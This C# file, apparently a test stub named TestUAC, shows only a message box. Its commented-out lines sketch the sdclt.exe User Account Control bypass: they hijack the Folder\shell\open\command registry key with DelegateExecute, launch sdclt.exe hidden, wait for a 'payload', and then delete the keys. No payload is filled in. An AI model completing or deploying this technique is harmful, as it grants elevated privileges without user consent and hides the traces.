using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace TestUAC
{
    class Program
    {
        static void Main(string[] args)
        {
            MessageBox.Show("Coucou from .Net!");
            //RegistryKey newkey = Registry.CurrentUser.OpenSubKey(@"Software\Classes\", true);
            //newkey.CreateSubKey(@"Folder\shell\open\command");

            //RegistryKey sdclt = Registry.CurrentUser.OpenSubKey(@"Software\Classes\Folder\shell\open\command", true);
            //sdclt.SetValue("", "");
            //sdclt.SetValue("DelegateExecute", "");
            //sdclt.Close();

            //////start process
            ////Process p = new Process();
            ////p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            ////p.StartInfo.FileName = "C:\\windows\\system32\\sdclt.exe";
            ////p.Start();

            //////sleep 10 seconds to let the payload execute
            ////Thread.Sleep(10000);

            ////Unset the registry
            //newkey.DeleteSubKeyTree("Folder");
        }
    }
}
